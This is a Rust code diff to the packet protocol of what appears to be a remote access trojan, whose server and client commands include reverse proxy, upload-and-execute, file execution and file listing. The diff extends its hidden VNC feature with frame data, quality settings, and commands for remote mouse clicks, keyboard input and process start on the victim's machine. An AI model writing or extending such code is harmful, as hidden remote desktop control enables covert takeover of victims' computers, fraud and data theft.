@@ -29,7 +29,7 @@ pub enum ServerboundPacket {
     FileList(Vec<File>),
     CurrentFolder(String),   
 
-    HVNCFrame(Vec<u8>),
+    HVNCFrame(HVNCFrame),
 }
 
 impl Packet for ServerboundPacket {
@@ -107,9 +107,11 @@ pub enum ClientboundPacket {
     StartReverseProxy(String),
     StopReverseProxy,
 
-    StartHVNC,
+    StartHVNC(HVNCConfig),
     StopHVNC,
-    OpenExplorer,
+    HVNCMouseClick(MouseClickData),
+    HVNCKeyboardInput(KeyboardInputData),
+    HVNCStartProcess(String),
     
     UploadAndExecute(FileData),
     ExecuteFile(String),
@@ -169,9 +171,11 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::StartReverseProxy(_) => "Start Reverse Proxy",
             ClientboundPacket::StopReverseProxy => "Stop Reverse Proxy",
 
-            ClientboundPacket::StartHVNC => "Start HVNC",
+            ClientboundPacket::StartHVNC(_) => "Start HVNC",
             ClientboundPacket::StopHVNC => "Stop HVNC",
-            ClientboundPacket::OpenExplorer => "Open Explorer",
+            ClientboundPacket::HVNCMouseClick(_) => "HVNC Mouse Click",
+            ClientboundPacket::HVNCKeyboardInput(_) => "HVNC Keyboard Input",
+            ClientboundPacket::HVNCStartProcess(_) => "HVNC Start Process",
             ClientboundPacket::UploadAndExecute(_) => "Upload And Execute",
             ClientboundPacket::ExecuteFile(_) => "Execute File",
             ClientboundPacket::UploadFile(_, _) => "Upload File",
@@ -264,6 +268,19 @@ pub struct ScreenshotData {
     pub width: u32,
     pub height: u32,
     pub data: Vec<u8>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct HVNCConfig {
+    pub quality: u8,
+    pub fps: u8,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct HVNCFrame {
+    pub data: Vec<u8>,
+    pub width: u32,
+    pub height: u32,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
